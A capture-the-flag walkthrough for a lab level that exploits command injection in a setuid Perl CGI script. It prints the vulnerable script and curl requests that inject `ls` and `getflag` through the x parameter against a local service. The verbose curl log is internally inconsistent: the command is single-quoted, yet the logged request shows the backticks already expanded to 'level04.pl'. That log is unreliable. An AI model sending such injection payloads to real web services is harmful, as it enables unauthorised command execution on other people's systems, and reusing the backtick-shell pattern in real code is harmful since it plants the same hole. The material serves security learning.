# Level 04

**Exploit:** OS command injection in Perl CGI

The CGI script inserts the `x` parameter into a shell command, allowing shell syntax to execute another command.

## Walkthrough

The script reads parameter `x` and passes its value to `echo` through the shell. Inspect the script:

```bash
file level04.pl
```

Output:

```text
level04.pl: setuid setgid a /usr/bin/perl script, ASCII text executable
```

```bash
cat level04.pl
```

Output:

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

The call `x(param("x"))` passes the request's `x` parameter to the subroutine. The backtick expression runs `echo` through a shell, making the parameter vulnerable to command injection.

Check that the local service responds:
```bash
curl -I http://localhost:4747
```

Output:

```text
HTTP/1.1 200 OK
Date: Tue, 13 Oct 2026 12:20:17 GMT
Server: Apache/2.2.22 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1
Content-Type: text/html
```

Pass `ls` as the parameter value:
```bash
curl -v 'http://localhost:4747/?x=`ls`'
```

Output:

```text
* About to connect() to localhost port 4747 (#0)
*   Trying 127.0.0.1... connected
> GET /?x=level04.pl HTTP/1.1
> User-Agent: curl/7.22.0 (i686-pc-linux-gnu) libcurl/7.22.0 OpenSSL/1.0.1 zlib/1.2.3.4 libidn/1.23 librtmp/2.3
> Host: localhost:4747
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Tue, 13 Oct 2026 12:21:57 GMT
< Server: Apache/2.2.22 (Ubuntu)
< Vary: Accept-Encoding
< Content-Length: 11
< Content-Type: text/html
< 
level04.pl
* Connection #0 to host localhost left intact
* Closing connection #0
```


The response contains the output of `ls`, confirming that the parameter is interpreted by the shell. Replace `ls` with `getflag`:

```bash
curl -v 'http://localhost:4747/?x=`getflag`'
```

The response contains the flag.
